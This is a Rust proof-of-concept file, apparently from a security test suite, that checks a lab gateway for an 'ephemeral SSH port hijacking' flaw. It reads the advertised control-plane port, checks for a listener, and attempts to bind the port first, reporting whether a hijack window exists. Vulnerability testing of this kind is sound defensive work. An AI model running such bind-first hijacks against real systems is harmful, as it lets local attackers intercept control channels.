// F4 - Ephemeral SSH port hijacking.
//
// Hypothesis: the gateway's control plane is exposed on an ephemeral port that
// holds no valid listener, so local malware can bind that port first and
// intercept the control channel.
//
// What actually distinguishes the two cases, and what the earlier version of
// this file got wrong: `TcpListener::bind` succeeding means the port is FREE.
// The old PoC treated a successful bind as proof of an SSH listener, and it
// always succeeded because it bound a port it had just proved free.
//
// Correct reasoning used here:
//   * if a control-plane listener is present, the port is taken, and hijacking
//     cannot happen - the gateway answers and reports the conflict
//   * if the port is free while the gateway claims to expose a control plane
//     there, an attacker can bind it first
//
// The lab gateway models the first case directly: it holds the control port and
// answers 503 "address already in use" when probed.
//
// Build:  rustc F4.rs -o F4
// Run:    ./F4 [--port 18789] [--low 32768] [--high 60999] [--json]

#![allow(dead_code, unused_imports)]

include!("poc_support.rs");

const CONTROL_PROBE: &str = "/control-plane";

fn main() {
    let args = Args::parse();
    let mut report = Report::new("F4", "Ephemeral SSH port hijacking");
    if !args.json {
        banner("F4", "Ephemeral SSH port hijacking");
        println!("    target: {}", args.addr());
    }

    // Step 1: does the gateway expose a control plane, and on which port?
    let probe = get(&args.host, args.port, CONTROL_PROBE);
    let control_port = match &probe {
        Some(r) if r.status == 503 => {
            // The conflict message names the port the gateway holds.
            let body = r.body.clone();
            let port = body
                .split(':')
                .nth(1)
                .and_then(|p| p.split_whitespace().next())
                .and_then(|p| p.parse::<u16>().ok());
            report.evidence(format!("gateway exposes a control plane: {}", body.trim()));
            port
        }
        Some(r) => {
            report.evidence(format!("control-plane probe -> HTTP {}", r.status));
            None
        }
        None => {
            report.note(format!("no HTTP response from {}", args.addr()));
            report.finish(args.json, 3);
        }
    };

    let Some(control_port) = control_port else {
        report.note("gateway advertises no control-plane port, so there is nothing to hijack");
        report.finish(args.json, 1);
    };
    report.evidence(format!("advertised control port: {control_port}"));

    // Step 2: is that port actually held by a listener?
    if port_has_listener(control_port) {
        report.evidence(format!("port {control_port} is held by a listener"));
        // A bind must now fail, which is the safe outcome.
        match TcpListener::bind((DEFAULT_HOST, control_port)) {
            Err(e) => {
                report.evidence(format!("attempted hijack bind failed: {e}"));
                report.note(
                    "the control-plane port is occupied, so local malware cannot take it",
                );
                report.finish(args.json, 1);
            }
            Ok(_) => {
                report.evidence("bound the control port even though a listener answered");
                report.note("the listener is reachable but not exclusive");
                report.confirmed = true;
                report.finish(args.json, 0);
            }
        }
    }

    // Step 3: the port is advertised but free - the hijack window is open.
    report.evidence(format!(
        "port {control_port} has no listener despite being advertised"
    ));
    match TcpListener::bind((DEFAULT_HOST, control_port)) {
        Ok(listener) => {
            report.evidence(format!("hijacked control port {control_port}"));
            report.note("local malware binding first owns the control channel");
            drop(listener);
            report.confirmed = true;
            report.finish(args.json, 0);
        }
        Err(e) => {
            report.note(format!("bind failed even though the port looked free: {e}"));
            report.finish(args.json, 1);
        }
    }
}
